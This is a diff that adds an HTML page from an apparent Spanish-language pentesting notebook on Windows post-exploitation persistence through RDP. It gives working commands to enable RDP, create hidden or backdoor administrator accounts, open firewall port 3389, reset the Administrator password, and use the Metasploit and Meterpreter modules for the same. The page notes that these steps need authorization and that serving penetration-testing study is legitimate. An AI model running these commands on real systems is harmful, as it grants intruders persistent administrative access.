@@ -1,0 +1,104 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RDP | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="rdp">
+          <div class="note-tabbar">
+            <span>RDP</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Post-Explotación/Windows/Persistencia</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">post-explotación / windows / persistencia</p>
+            <h2>RDP</h2>
+
+            <p>Habilitar RDP y crear usuarios locales es una técnica ruidosa y muy intrusiva. En entornos reales debe estar autorizada, registrada y revertirse al finalizar la prueba.</p>
+
+            <section class="code-card">
+              <h3>Habilitar RDP</h3>
+              <pre><code>reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v &quot;fDenyTSConnections&quot; /t REG_DWORD /d 0 /f</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>CMD: Crear Usuario y Agregar al grupo RDP y Administrators</h3>
+              <pre><code>net user &lt;user&gt; &lt;password&gt; /add
+net localgroup &quot;Remote Desktop Users&quot; &lt;user&gt; /add
+net localgroup Administrators &lt;user&gt; /add
+net user</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Kali: Conectarnos por RDP usando estas credenciales.</h3>
+              <pre><code>xfreerdp /u:&lt;user&gt;  /p:&lt;password&gt; /v:&lt;ip_target&gt;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>One Liner: Crear usuario, Agregar a grupo RDP, Habilitar RDP</h3>
+              <pre><code>net user hacker Hacker123456@ /add &amp; net localgroup Administrators hacker /add &amp; net localgroup &quot;Remote Desktop Users&quot; hacker /add &amp; reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f &amp; reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fAllowToGetHelp /t REG_DWORD /d 1 /f &amp; netsh firewall add portopening TCP 3389 &quot;Remote Desktop&quot; &amp; netsh firewall set service remoteadmin enable</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Meterpreter: getgui</h3>
+              <pre><code># Otra Opción desde meterpreter 
+# getgui -&gt; 1. Habilita RDP si no lo está 
+#           2. Crea un usuario y lo oculta al iniciar sesión
+#           3. Lo añade a rdp y al grupo Administrator
+run getgui -e -u alice -p hack_123321</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Kali: Conectarnos por RDP usando estas credenciales.</h3>
+              <pre><code>xfreerdp /u:alice /p:hack_123321 /v:&lt;ip_target&gt;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Metasploit</h3>
+              <pre><code># Habilitar RDP
+use post/windows/manage/enable_rdp
+set SESSION
+run</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Cambiar contraseña Administrator siendo nt-authority/system</h3>
+              <pre><code>net user Administrator password_123</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Kali: Conectarnos por RDP usando estas credenciales.</h3>
+              <pre><code>xfreerdp /u:Administrator /p:password_123 /v:&lt;ip_target&gt;</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>post_explotacion</span>
+              <span>persistencia</span>
+              <span>rdp</span>
+              <span>xfreerdp</span>
+              <span>usuarios</span>
+              <span>metasploit</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
